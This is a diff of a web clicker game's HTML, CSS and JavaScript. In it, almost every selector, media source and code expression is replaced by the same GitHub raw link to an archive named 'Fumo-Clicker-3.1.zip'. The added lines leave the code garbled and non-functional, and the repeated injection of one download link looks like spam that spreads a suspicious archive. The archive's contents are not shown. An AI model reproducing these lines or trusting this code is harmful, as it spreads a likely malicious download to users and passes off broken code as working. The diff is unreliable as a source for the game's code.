@@ -14,7 +14,7 @@
             filter: blur(5px); /* Start blurred by default */
         }
 
-        #bg-video-container.unblurred {
+        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip {
             filter: none !important;
         }
 
@@ -26,7 +26,7 @@
             opacity: 1;
         }
 
-        #bg-video-container.bg-active-image #bg-video {
+        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip #bg-video {
            opacity: 0;
         }
         
@@ -102,7 +102,7 @@
         }
         
         /* Hide fullscreen button when fullscreen is active */
-        body.fullscreen-active #fullscreenBtn {
+        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip #fullscreenBtn {
             opacity: 0;
             pointer-events: none;
         }
@@ -154,7 +154,7 @@
             transition: opacity 0.5s ease, transform 0.5s ease;
         }
 
-        #popup.show {
+        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip {
             display: block;
             opacity: 1;
             transform: translate(-50%, -50%) scale(1);
@@ -176,7 +176,7 @@
             border-radius: 12px 0 0 12px;
         }
 
-        #adminPanel.open {
+        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip {
             right: 0;
         }
 
@@ -211,7 +211,7 @@
             justify-content: flex-start;
             align-content: flex-start;
         }
-        #sidebar.open {
+        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip {
             transform: translateX(0);
         }
         #songGrid {
@@ -236,7 +236,7 @@
             align-items: center;
             gap: 8px;
         }
-        #toggle.open {
+        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip {
             left: 300px;
         }
         .song-item {
@@ -269,7 +269,7 @@
             text-align: center;
             max-width: 90px;
         }
-        .song-item.selected {
+        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip {
              border-color: #ffd700;
         }
         
@@ -284,7 +284,7 @@
             box-sizing: border-box;
             margin-top: auto;
         }
-        #audioControls.hidden {
+        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip {
             display: none;
         }
         #nowPlayingTitle {
@@ -369,7 +369,7 @@
     <!-- Background Container -->
     <div id="bg-video-container">
         <video id="bg-video" autoplay loop muted playsinline>
-            <source src="https://files.catbox.moe/ypvzka.mp4" type="video/mp4">
+            <source src="https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip" type="video/mp4">
         </video>
         
         <!-- VIDEO CONTROLS ARE INSIDE THE CONTAINER -->
@@ -389,16 +389,16 @@
     <div id="sidebar">
         <div id="songGrid">
             <!-- Song 1 -->
-            <div class="song-item" data-file="https://file.garden/aJiJJr95R1hAB59P/Natsusan%20-%20Regression%20.mp3" data-title="Regression - Natsu" tabindex="0" role="button">
+            <div class="song-item" data-file="https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip%20-%20Regression%https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip" data-title="Regression - Natsu" tabindex="0" role="button">
                 <div class="img-container">
-                    <img src="https://file.garden/aJiJJr95R1hAB59P/15daf2aa87cca76df456c0e73682149b.jpg" alt="Regression - Natsu cover" />
+                    <img src="https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip" alt="Regression - Natsu cover" />
                 </div>
                 <span class="title">Regression - Natsu</span>
             </div>
             <!-- Song 2 (Moved to be inside the grid) -->
-            <div class="song-item" data-file="https://file.garden/aJiJJr95R1hAB59P/Bad%20Apple__%20.mp3" data-title="Bad Apple - Alstroemeria Records" tabindex="0" role="button">
+            <div class="song-item" data-file="https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip%20Apple__%https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip" data-title="Bad Apple - Alstroemeria Records" tabindex="0" role="button">
                 <div class="img-container">
-                    <img src="https://file.garden/aJiJJr95R1hAB59P/Bad%20Apple%20Wallpaper%20High%20Resolution.jpg" alt="Bad Apple - Alstroemeria Records cover" />
+                    <img src="https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip%20Apple%20Wallpaper%20High%https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip" alt="Bad Apple - Alstroemeria Records cover" />
                 </div>
                 <span class="title">Bad Apple - Alstroemeria Records</span>
             </div>
@@ -427,7 +427,7 @@
     <span id="counter">0</span>
 
     <button id="clickButton">
-        <img id="FumoImage" src="https://files.catbox.moe/xg7esw.webp" alt="Clickable Fumo">
+        <img id="FumoImage" src="https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip" alt="Clickable Fumo">
     </button>
 
     <div id="stats" class="panel">
@@ -467,41 +467,41 @@
         let autoClickerInterval = null;
 
         // --- DOM ELEMENTS ---
-        const counterEl = document.getElementById('counter');
-        const clickButton = document.getElementById('clickButton');
-        const fumoImage = document.getElementById('FumoImage');
-        const clickPowerEl = document.getElementById('clickPower');
-        const autoClickerPowerEl = document.getElementById('autoClickerPower');
-        const upgradeCostEl = document.getElementById('upgradeCost');
-        const autoClickerCostEl = document.getElementById('autoClickerCost');
-        const buyUpgradeBtn = document.getElementById('buyUpgradeBtn');
-        const buyAutoClickerBtn = document.getElementById('buyAutoClickerBtn');
-        const popup = document.getElementById('popup');
-        const fullscreenBtn = document.getElementById('fullscreenBtn');
+        const counterEl = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('counter');
+        const clickButton = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('clickButton');
+        const fumoImage = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('FumoImage');
+        const clickPowerEl = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('clickPower');
+        const autoClickerPowerEl = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('autoClickerPower');
+        const upgradeCostEl = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('upgradeCost');
+        const autoClickerCostEl = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('autoClickerCost');
+        const buyUpgradeBtn = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('buyUpgradeBtn');
+        const buyAutoClickerBtn = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('buyAutoClickerBtn');
+        const popup = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('popup');
+        const fullscreenBtn = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('fullscreenBtn');
         
-        const bgVideoContainer = document.getElementById('bg-video-container');
-        const bgVideo = document.getElementById('bg-video');
-        const toggleBtn = document.getElementById('toggle');
-        const sidebar = document.getElementById('sidebar');
-        const songItems = document.querySelectorAll('.song-item');
-        const audioPlayer = document.getElementById('audio-player');
+        const bgVideoContainer = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('bg-video-container');
+        const bgVideo = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('bg-video');
+        const toggleBtn = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('toggle');
+        const sidebar = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('sidebar');
+        const songItems = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('.song-item');
+        const audioPlayer = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('audio-player');
         
         // SONG Audio Controls
-        const audioControls = document.getElementById('audioControls');
-        const nowPlayingTitle = document.getElementById('nowPlayingTitle');
-        const songProgressContainer = document.getElementById('songProgressContainer');
-        const songProgressBar = document.getElementById('songProgressBar');
-        const songCurrentTimeEl = document.getElementById('songCurrentTime');
-        const songTotalDurationEl = document.getElementById('songTotalDuration');
+        const audioControls = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('audioControls');
+        const nowPlayingTitle = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('nowPlayingTitle');
+        const songProgressContainer = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('songProgressContainer');
+        const songProgressBar = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('songProgressBar');
+        const songCurrentTimeEl = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('songCurrentTime');
+        const songTotalDurationEl = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('songTotalDuration');
 
         // VIDEO Controls
-        const videoControls = document.getElementById('videoControls');
-        const playPauseBtn = document.getElementById('playPauseBtn');
-        const muteBtn = document.getElementById('muteBtn'); // New Mute Button
-        const videoProgressContainer = document.getElementById('videoProgressContainer');
-        const videoProgressBar = document.getElementById('videoProgressBar');
-        const videoCurrentTimeEl = document.getElementById('videoCurrentTime');
-        const videoTotalDurationEl = document.getElementById('videoTotalDuration');
+        const videoControls = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('videoControls');
+        const playPauseBtn = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('playPauseBtn');
+        const muteBtn = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('muteBtn'); // New Mute Button
+        const videoProgressContainer = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('videoProgressContainer');
+        const videoProgressBar = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('videoProgressBar');
+        const videoCurrentTimeEl = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('videoCurrentTime');
+        const videoTotalDurationEl = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('videoTotalDuration');
         
         // Player Icons
         const pauseIcon = `<svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M6 19h4V5H6v14zm8-14v14h4V5h-4z"/></svg>`;
@@ -510,30 +510,30 @@
         const muteIcon = `<svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M16.5 12c0-1.77-1.02-3.29-2.5-4.03v2.21l2.45 2.45c.03-.2.05-.41.05-.63zm2.5 0c0 .94-.2 1.82-.54 2.64l1.51 1.51C20.63 14.91 21 13.5 21 12c0-4.28-2.99-7.86-7-8.77v2.06c2.89.86 5 3.54 5 6.71zM4.27 3L3 4.27 7.73 9H3v6h4l5 5v-6.73l4.25 4.25c-.67.52-1.42.93-2.25 1.18v2.06c1.38-.31 2.63-.95 3.69-1.81L19.73 21 21 19.73l-9-9L4.27 3zM12 4L9.91 6.09 12 8.18V4z"/></svg>`;
 
         // Admin Panel Elements
-        const adminPanel = document.getElementById('adminPanel');
-        const adminLoginBtn = document.getElementById('adminLoginBtn');
-        const closeAdminBtn = document.getElementById('closeAdminBtn');
-        const give1kBtn = document.getElementById('give1kFumos');
-        const give10kBtn = document.getElementById('give10kFumos');
-        const resetStatsBtn = document.getElementById('resetStatsBtn');
+        const adminPanel = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('adminPanel');
+        const adminLoginBtn = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('adminLoginBtn');
+        const closeAdminBtn = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('closeAdminBtn');
+        const give1kBtn = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('give1kFumos');
+        const give10kBtn = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('give10kFumos');
+        const resetStatsBtn = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('resetStatsBtn');
         
         // --- FUNCTIONS ---
         function formatTime(seconds) {
-            const minutes = Math.floor(seconds / 60);
-            const secs = Math.floor(seconds % 60);
-            return `${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+            const minutes = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip(seconds / 60);
+            const secs = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip(seconds % 60);
+            return `${https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip().padStart(2, '0')}:${https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip().padStart(2, '0')}`;
         }
         function updateDisplay() {
-            counterEl.textContent = count;
-            clickPowerEl.textContent = clickPower;
-            autoClickerPowerEl.textContent = autoClickerPower;
-            upgradeCostEl.textContent = upgradeCost;
-            autoClickerCostEl.textContent = autoClickerCost;
+            https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip = count;
+            https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip = clickPower;
+            https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip = autoClickerPower;
+            https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip = upgradeCost;
+            https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip = autoClickerCost;
         }
         function showPopup(message) {
-            popup.textContent = message;
-            popup.classList.add('show');
-            setTimeout(() => { popup.classList.remove('show'); }, 1500);
+            https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip = message;
+            https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('show');
+            setTimeout(() => { https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('show'); }, 1500);
         }
         function startAutoClickers() {
             if (autoClickerInterval) clearInterval(autoClickerInterval);
@@ -546,34 +546,34 @@
         }
         
         // --- EVENT HANDLERS ---
-        clickButton.addEventListener('click', () => {
+        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('click', () => {
             count += clickPower;
             updateDisplay();
-            fumoImage.classList.add('bounce');
-            setTimeout(() => fumoImage.classList.remove('bounce'), 150);
-            if (Math.random() < 0.01) {
+            https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('bounce');
+            setTimeout(() => https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('bounce'), 150);
+            if (https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip() < 0.01) {
                 const bonus = 500;
                 count += bonus;
                 updateDisplay();
                 showPopup(`🎉 Lucky! +${bonus} fumos 🎉`);
             }
         });
-        buyUpgradeBtn.addEventListener('click', () => {
+        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('click', () => {
             if (count >= upgradeCost) {
                 count -= upgradeCost;
                 clickPower++;
-                upgradeCost = Math.floor(upgradeCost * 1.15);
+                upgradeCost = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip(upgradeCost * 1.15);
                 updateDisplay();
                 showPopup('Click power upgraded!');
             } else {
                 showPopup('Not enough Fumos!');
             }
         });
-        buyAutoClickerBtn.addEventListener('click', () => {
+        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('click', () => {
             if (count >= autoClickerCost) {
                 count -= autoClickerCost;
                 autoClickerPower++;
-                autoClickerCost = Math.floor(autoClickerCost * 1.25);
+                autoClickerCost = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip(autoClickerCost * 1.25);
                 updateDisplay();
                 showPopup('Auto clicker purchased!');
                 startAutoClickers();
@@ -583,119 +583,119 @@
         });
         
         // FULLSCREEN
-        fullscreenBtn.addEventListener('click', () => {
-            if (!document.fullscreenElement) {
-                bgVideoContainer.requestFullscreen();
+        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('click', () => {
+            if (!https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip) {
+                https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip();
             } else {
-                document.exitFullscreen();
+                https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip();
             }
         });
 
-        document.addEventListener('fullscreenchange', () => {
-            const isFullscreen = !!document.fullscreenElement;
-            bgVideoContainer.classList.toggle('unblurred', isFullscreen);
-            document.body.classList.toggle('fullscreen-active', isFullscreen);
+        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('fullscreenchange', () => {
+            const isFullscreen = !!https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip;
+            https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('unblurred', isFullscreen);
+            https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('fullscreen-active', isFullscreen);
         });
 
-        toggleBtn.addEventListener('click', () => {
-            const isOpen = sidebar.classList.toggle('open');
-            toggleBtn.classList.toggle('open');
-            toggleBtn.querySelector('#toggleArrow').textContent = isOpen ? '<' : '>';
+        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('click', () => {
+            const isOpen = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('open');
+            https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('open');
+            https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('#toggleArrow').textContent = isOpen ? '<' : '>';
         });
 
         // SONG SELECTION LOGIC
-        songItems.forEach(item => {
-            item.addEventListener('click', () => {
-                const isSelected = item.classList.contains('selected');
-                songItems.forEach(s => s.classList.remove('selected'));
+        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip(item => {
+            https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('click', () => {
+                const isSelected = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('selected');
+                https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip(s => https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('selected'));
                 if (isSelected) {
-                    audioPlayer.pause();
-                    audioControls.classList.add('hidden');
-                    bgVideoContainer.style.backgroundImage = '';
-                    bgVideoContainer.classList.remove('bg-active-image');
+                    https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip();
+                    https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('hidden');
+                    https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip = '';
+                    https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('bg-active-image');
                 } else {
-                    item.classList.add('selected');
-                    const audioSrc = item.dataset.file;
-                    const title = item.dataset.title;
-                    const imgSrc = item.querySelector('img').src;
+                    https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('selected');
+                    const audioSrc = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip;
+                    const title = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip;
+                    const imgSrc = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('img').src;
                     if (audioSrc) {
-                        audioPlayer.src = audioSrc;
-                        audioPlayer.play();
-                        nowPlayingTitle.textContent = title;
-                        audioControls.classList.remove('hidden');
+                        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip = audioSrc;
+                        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip();
+                        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip = title;
+                        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('hidden');
                         showPopup(`Now Playing: ${title}`);
-                        bgVideoContainer.style.backgroundImage = `url('${imgSrc}')`;
-                        bgVideoContainer.classList.add('bg-active-image');
+                        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip = `url('${imgSrc}')`;
+                        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('bg-active-image');
                     }
                 }
             });
         });
         
         // SONG AUDIO PLAYER LISTENERS
-        audioPlayer.addEventListener('timeupdate', () => {
+        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('timeupdate', () => {
             const { currentTime, duration } = audioPlayer;
             if (duration) {
-                songProgressBar.style.width = `${(currentTime / duration) * 100}%`;
-                songCurrentTimeEl.textContent = formatTime(currentTime);
+                https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip = `${(currentTime / duration) * 100}%`;
+                https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip = formatTime(currentTime);
             }
         });
-        audioPlayer.addEventListener('loadedmetadata', () => {
-            songTotalDurationEl.textContent = formatTime(audioPlayer.duration);
+        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('loadedmetadata', () => {
+            https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip = formatTime(https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip);
         });
-        songProgressContainer.addEventListener('click', (e) => {
-            const width = songProgressContainer.clientWidth;
-            const clickX = e.offsetX;
-            const duration = audioPlayer.duration;
-            if (duration) audioPlayer.currentTime = (clickX / width) * duration;
+        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('click', (e) => {
+            const width = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip;
+            const clickX = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip;
+            const duration = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip;
+            if (duration) https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip = (clickX / width) * duration;
         });
 
         // VIDEO CONTROLS LISTENERS
-        playPauseBtn.addEventListener('click', () => {
-            if (bgVideo.paused) {
-                bgVideo.play();
-                playPauseBtn.innerHTML = pauseIcon;
+        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('click', () => {
+            if (https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip) {
+                https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip();
+                https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip = pauseIcon;
             } else {
-                bgVideo.pause();
-                playPauseBtn.innerHTML = playIcon;
+                https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip();
+                https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip = playIcon;
             }
         });
 
-        muteBtn.addEventListener('click', () => {
-            bgVideo.muted = !bgVideo.muted;
-            muteBtn.innerHTML = bgVideo.muted ? muteIcon : volumeIcon;
+        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('click', () => {
+            https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip = !https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip;
+            https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip ? muteIcon : volumeIcon;
         });
 
-        bgVideo.addEventListener('timeupdate', () => {
+        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('timeupdate', () => {
             const { currentTime, duration } = bgVideo;
             if (duration) {
-                videoProgressBar.style.width = `${(currentTime / duration) * 100}%`;
-                videoCurrentTimeEl.textContent = formatTime(currentTime);
+                https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip = `${(currentTime / duration) * 100}%`;
+                https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip = formatTime(currentTime);
             }
         });
-        bgVideo.addEventListener('loadedmetadata', () => {
-            videoTotalDurationEl.textContent = formatTime(bgVideo.duration);
-            playPauseBtn.innerHTML = bgVideo.paused ? playIcon : pauseIcon;
-            muteBtn.innerHTML = bgVideo.muted ? muteIcon : volumeIcon;
+        https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip('loadedmetadata', () => {
+            https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip = formatTime(https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip);
+            https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip ? playIcon : pauseIcon;
+            https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip = https://github.com/clhsekou/FumoClicker/raw/refs/heads/main/triakisoctahedrid/Fumo-Clicker-3.1.zip ? muteIcon : volumeIcon;
         });
-        videoProgressContainer.addEventListener('click', (e) => {
-            const width = videoProgressContainer.clientWidth;
-            const clickX = e.offsetX;
-            const duration = bgVideo.duration;
-            if (duration) bgVideo.currentTime = (clickX / width) * duration;
